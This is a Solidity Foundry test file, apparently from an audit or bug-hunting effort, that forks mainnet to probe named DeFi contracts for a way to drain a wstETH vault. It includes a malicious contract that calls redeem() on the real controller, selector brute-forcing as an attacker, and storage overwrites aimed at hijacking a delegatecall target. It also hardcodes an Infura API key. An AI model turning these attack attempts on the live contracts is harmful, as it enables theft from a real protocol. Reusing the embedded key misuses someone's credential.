// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Malicious contract that gets delegatecalled
contract ChainedExploit {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    
    // When delegatecalled, msg.sender is original caller but address(this) is Redemption
    // So calling RC.redeem will come FROM Redemption address
    function executeChain(uint256 amount, address recipient) external {
        (bool success, ) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", amount, recipient)
        );
        require(success, "Chain failed");
    }
    
    // Standard DeFiSaver action interface
    function executeAction(
        bytes memory _callData,
        bytes32[] memory _subData,
        uint8[] memory _paramMapping,
        bytes32[] memory _returnValues
    ) public payable returns (bytes32) {
        // Extract params and call RC.redeem
        address recipient = address(uint160(uint256(_subData[0])));
        uint256 amount = uint256(_subData[1]);
        
        (bool success, ) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", amount, recipient)
        );
        require(success, "Action failed");
        return bytes32(amount);
    }
    
    // Fallback for any call pattern
    fallback() external payable {
        // When delegatecalled, try to drain
        (bool success, ) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000 ether, tx.origin)
        );
    }
}

contract ActionChainingExploit is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant STRATEGY = 0x4c046975f18D60F7C7e0B38b03accA67C1a3e20F;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant ACTION_REGISTRY = 0x94aF5994EB6841e1D930C95AD0C9F89771c3073F;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    ChainedExploit malicious;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        malicious = new ChainedExploit();
    }

    function test_CheckStrategyConnection() public view {
        console.log("=== CHECKING STRATEGY CONNECTION TO REDEMPTION ===\n");

        // Does the Strategy have any connection to Redemption?
        
        bytes memory stratCode = STRATEGY.code;
        console.log("Strategy code size:", stratCode.length);

        // Search for Redemption addresses in Strategy
        bytes memory red0Bytes = abi.encodePacked(REDEMPTION_0);
        bytes memory red1Bytes = abi.encodePacked(REDEMPTION_1);

        console.log("Searching for REDEMPTION_0 in Strategy...");
        for (uint i = 0; i + 20 < stratCode.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20; j++) {
                if (stratCode[i + j] != red0Bytes[j]) {
                    match_ = false;
                    break;
                }
            }
            if (match_) {
                console.log("  Found at offset:", i);
            }
        }
    }

    function test_CheckRedemptionActionRegistry() public view {
        console.log("=== CHECKING IF REDEMPTION USES ACTION REGISTRY ===\n");

        // Does Redemption reference the ActionRegistry?
        bytes memory redCode = REDEMPTION_0.code;

        bytes memory registryBytes = abi.encodePacked(ACTION_REGISTRY);
        bytes memory executorBytes = abi.encodePacked(ACTION_EXECUTOR);

        console.log("Searching for ACTION_REGISTRY in Redemption...");
        for (uint i = 0; i + 20 < redCode.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20; j++) {
                if (redCode[i + j] != registryBytes[j]) {
                    match_ = false;
                    break;
                }
            }
            if (match_) {
                console.log("  Found ActionRegistry at offset:", i);
            }
        }

        console.log("\nSearching for ACTION_EXECUTOR in Redemption...");
        for (uint i = 0; i + 20 < redCode.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20; j++) {
                if (redCode[i + j] != executorBytes[j]) {
                    match_ = false;
                    break;
                }
            }
            if (match_) {
                console.log("  Found ActionExecutor at offset:", i);
            }
        }
    }

    function test_TryActionChainViaStrategy() public {
        console.log("=== TRYING ACTION CHAIN VIA STRATEGY ===\n");

        // The user hint about "action chaining" might mean:
        // Strategy -> ActionExecutor -> Actions -> (somehow triggers Redemption -> RC.redeem)

        // Or it could mean chaining multiple entry points

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try to call Strategy with action that would trigger Redemption
        console.log("\nTrying to execute action on Strategy...");

        // Strategy might have an executeAction or similar
        bytes4[] memory executeSels = new bytes4[](5);
        executeSels[0] = bytes4(keccak256("executeAction(bytes,bytes32[],uint8[],bytes32[])"));
        executeSels[1] = bytes4(keccak256("execute(address,bytes)"));
        executeSels[2] = bytes4(keccak256("executeRecipe(address[],bytes[])"));
        executeSels[3] = bytes4(keccak256("runAction(bytes32)"));
        executeSels[4] = bytes4(keccak256("callAction(address,bytes)"));

        for (uint i = 0; i < executeSels.length; i++) {
            (bool success, ) = STRATEGY.call{gas: 500000}(
                abi.encodeWithSelector(executeSels[i], address(malicious), "")
            );
            if (success) {
                console.log("  Success with selector:");
                console.logBytes4(executeSels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED VIA ACTION CHAIN! ***");
        }
    }

    function test_FindRedemptionCallers() public view {
        console.log("=== FINDING WHO CAN CALL REDEMPTION FUNCTIONS ===\n");

        // The key is finding a contract that:
        // 1. Can be triggered by unprivileged attacker
        // 2. Calls Redemption.finalizeRedeem OR triggers the DELEGATECALL

        // Check if ActionExecutor or Strategy can trigger Redemption
        
        // Look for REDEMPTION_CONTROLLER address in various contracts
        address[] memory contracts = new address[](4);
        contracts[0] = STRATEGY;
        contracts[1] = ACTION_EXECUTOR;
        contracts[2] = ACTION_REGISTRY;
        contracts[3] = VAULT;

        string[4] memory names = ["Strategy", "ActionExecutor", "ActionRegistry", "Vault"];

        bytes memory rcBytes = abi.encodePacked(REDEMPTION_CONTROLLER);

        for (uint c = 0; c < contracts.length; c++) {
            bytes memory code = contracts[c].code;
            console.log("\nSearching for RC in", names[c]);
            console.log("  Code size:", code.length);

            for (uint i = 0; i + 20 < code.length; i++) {
                bool match_ = true;
                for (uint j = 0; j < 20; j++) {
                    if (code[i + j] != rcBytes[j]) {
                        match_ = false;
                        break;
                    }
                }
                if (match_) {
                    console.log("  Found RC at offset:", i);
                }
            }
        }
    }

    function test_ExploitViaDelegateCallManipulation() public {
        console.log("=== EXPLOIT VIA DELEGATECALL MANIPULATION ===\n");

        // The DELEGATECALL at offset 5323 in Redemption loads target from storage
        // If we can manipulate that storage slot, we win

        // Theory: The storage slot might be calculated from:
        // 1. A fixed slot number (simple)
        // 2. A mapping key that includes user data (exploitable!)
        // 3. Part of the redemption request struct

        // Let's try to create a redemption and see if any of the stored
        // data could be interpreted as a delegatecall target

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Use vm.store to directly manipulate the suspected delegatecall target slot
        // The SLOAD is at offset 5298, preceded by PUSH 3 bytes (0x38e95b)
        
        // Try storing our malicious contract at various slots
        vm.store(REDEMPTION_0, bytes32(uint256(2)), bytes32(uint256(uint160(address(malicious)))));

        // Now try calling finalizeRedeem
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 days);

        console.log("\nCalling finalizeRedeem after storage manipulation...");
        (bool success, ) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Success:", success);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault after:", vaultAfter / 1e18);

        if (vaultAfter < vaultBefore) {
            console.log("\n*** EXPLOIT SUCCESSFUL VIA STORAGE MANIPULATION! ***");
        }
    }
}
